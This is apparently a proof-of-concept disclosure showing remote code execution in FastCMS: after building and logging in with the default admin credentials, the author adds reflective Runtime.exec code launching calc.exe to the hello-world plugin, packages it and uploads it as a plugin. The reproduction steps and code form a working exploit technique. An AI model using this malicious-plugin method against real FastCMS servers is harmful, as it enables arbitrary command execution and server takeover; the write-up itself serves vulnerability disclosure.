# RCE

- windows10
- jdk17
- mysql5.7

## 1、build

```sh
git clone https://github.com/my-fastcms/fastcms.git
cd fastcms
```

SQL

- fastcms/web/src/main/resources/application.yml
- fastcms/doc/sql/fastcms.sql

```sh
.\build.bat
```

<img width="740" height="241" alt="建造完成" src="https://github.com/user-attachments/assets/5ceecde5-ab05-4333-aa70-b95a50a40e62" />


## 2、web

```sh
 # fastcms/.dist
 cd .dist
 .\startup.cmd
```

<img width="1665" height="114" alt="启动" src="https://github.com/user-attachments/assets/6cfe0119-2515-45ac-bf1a-2236d942e112" />


login：http://127.0.0.1:8080/fastcms.html，admin/1

## 3、jar

```sh
# fastcms/plugins/hello-world-plugin
cd ../plugins/hello-world-plugin
```

`fastcms/plugins/hello-world-plugin/src/main/java/com/fastcms/hello/HelloPlugin.java`

```java
public void calc() {
    try {
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        Method getRuntime = runtimeClass.getMethod("getRuntime");
        Object runtimeObj = getRuntime.invoke(null);
        Method exec = runtimeClass.getMethod("exec", String.class);
        String cmd = "calc.exe";
        exec.invoke(runtimeObj, cmd);
    } catch (Exception e) {

    }
}
```

<img width="931" height="595" alt="构造1" src="https://github.com/user-attachments/assets/6443b88a-3de6-4de8-8cc9-2314c8d7976b" />


```sh
# fastcms/plugins/hello-world-plugin/
mvn clean package
```

<img width="1585" height="190" alt="jar文件路径" src="https://github.com/user-attachments/assets/0a24f949-6a44-4dd2-a5ba-6ce3a2d5900d" />


fastcms\plugins\hello-world-plugin\target\hello-world-plugin-0.1.6-SNAPSHOT.jar



**upload**

<img width="1485" height="523" alt="安装插件" src="https://github.com/user-attachments/assets/14c48384-ee46-4f2a-a0bc-e7b496be2811" />


fastcms\plugins\hello-world-plugin\target\hello-world-plugin-0.1.6-SNAPSHOT.jar

<img width="783" height="540" alt="选择上传" src="https://github.com/user-attachments/assets/cec4d37d-faeb-4dcb-86d0-6f3017c9260a" />

<img width="1607" height="823" alt="上传成功" src="https://github.com/user-attachments/assets/232a36bd-93b5-4db3-98b3-45bfdbf2c558" />
